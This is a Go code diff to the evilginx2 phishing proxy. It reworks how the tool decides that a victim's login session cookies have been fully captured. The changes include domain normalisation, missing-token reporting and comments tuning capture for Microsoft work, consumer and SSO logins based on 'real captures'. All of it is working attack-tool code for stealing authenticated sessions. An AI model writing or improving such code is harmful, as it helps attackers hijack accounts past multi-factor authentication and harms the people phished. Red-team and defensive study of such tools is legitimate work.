@@ -1,6 +1,8 @@
 package core
 
 import (
+	"sort"
+	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -115,43 +117,124 @@ func (s *Session) AddCookieAuthToken(domain string, key string, value string, pa
 	}
 }
 
-func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
-	tcopy := make(map[string][]CookieAuthToken)
-	for k, v := range authTokens {
-		tcopy[k] = []CookieAuthToken{}
-		for _, at := range v {
-			if !at.optional {
-				tcopy[k] = append(tcopy[k], *at)
-			}
+// label names a declared auth token for reporting.
+func (at *CookieAuthToken) label() string {
+	if at.name != "" {
+		return at.name
+	}
+	if at.re != nil {
+		return at.re.String()
+	}
+	return "?"
+}
+
+// capturedAuthIndex returns captured cookie names keyed by domain with the
+// leading dot stripped, so the same cookie lands in one bucket whether it
+// arrived with or without a Domain attribute.
+func (s *Session) capturedAuthIndex() map[string]map[string]bool {
+	idx := map[string]map[string]bool{}
+	for d, toks := range s.CookieTokens {
+		key := strings.TrimPrefix(d, ".")
+		if idx[key] == nil {
+			idx[key] = map[string]bool{}
+		}
+		for n := range toks {
+			idx[key][n] = true
 		}
 	}
+	return idx
+}
 
-	for domain, tokens := range s.CookieTokens {
-		for tk := range tokens {
-			if al, ok := tcopy[domain]; ok {
-				for an, at := range al {
-					match := false
-					if at.re != nil {
-						match = at.re.MatchString(tk)
-					} else if at.name == tk {
-						match = true
-					}
-					if match {
-						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
-						if len(tcopy[domain]) == 0 {
-							delete(tcopy, domain)
-						}
-						break
-					}
+func tokenMatches(at *CookieAuthToken, name string) bool {
+	if at.re != nil {
+		return at.re.MatchString(name)
+	}
+	return at.name == name
+}
+
+// HasAnyCookieAuthToken reports whether at least one declared auth cookie has
+// been captured. It distinguishes "no evidence at all" from "evidence complete",
+// which matters because a session that has not yet reached any declared domain
+// also has an empty missing set.
+func (s *Session) HasAnyCookieAuthToken(authTokens map[string][]*CookieAuthToken) bool {
+	idx := s.capturedAuthIndex()
+	for domain, declared := range authTokens {
+		names := idx[strings.TrimPrefix(domain, ".")]
+		for _, at := range declared {
+			for name := range names {
+				if tokenMatches(at, name) {
+					return true
 				}
 			}
 		}
 	}
-
-	if len(tcopy) == 0 {
-		return true
-	}
 	return false
+}
+
+// MissingCookieAuthTokens reports which of the phishlet's declared, non-optional
+// auth cookies have not been captured, per domain.
+//
+// Two deliberate softenings, both learned from real captures:
+//
+//   - Domains are compared with the leading dot stripped. Microsoft sets some
+//     cookies with a Domain attribute and some without, so the same name lands in
+//     either bucket; matching on the dotted form alone reports false misses.
+//   - Only domains we have actually seen are considered. A host the victim never
+//     reached is not evidence of absence, which keeps consumer-vs-work and
+//     SSO-vs-password flows workable.
+//
+// An empty result therefore means "the cookie evidence is complete" - use
+// HasAnyCookieAuthToken to tell that apart from "nothing captured yet".
+func (s *Session) MissingCookieAuthTokens(authTokens map[string][]*CookieAuthToken) map[string][]string {
+	captured := s.capturedAuthIndex()
+
+	out := map[string][]string{}
+	for domain, declared := range authTokens {
+		names, seen := captured[strings.TrimPrefix(domain, ".")]
+		if !seen {
+			continue
+		}
+		for _, at := range declared {
+			if at.optional {
+				continue
+			}
+			matched := false
+			for name := range names {
+				if tokenMatches(at, name) {
+					matched = true
+					break
+				}
+			}
+			if !matched {
+				out[domain] = append(out[domain], at.label())
+			}
+		}
+	}
+	return out
+}
+
+// missingSummary renders a missing-token map for logs and API reasons.
+func missingSummary(m map[string][]string) string {
+	if len(m) == 0 {
+		return ""
+	}
+	domains := make([]string, 0, len(m))
+	for d := range m {
+		domains = append(domains, d)
+	}
+	sort.Strings(domains)
+	parts := make([]string, 0, len(domains))
+	for _, d := range domains {
+		names := append([]string(nil), m[d]...)
+		sort.Strings(names)
+		parts = append(parts, d+": "+strings.Join(names, ", "))
+	}
+	return strings.Join(parts, "; ")
+}
+
+// AllCookieAuthTokensCaptured is the boolean form of MissingCookieAuthTokens.
+func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
+	return len(s.MissingCookieAuthTokens(authTokens)) == 0
 }
 
 func (s *Session) Finish(is_auth_url bool) {
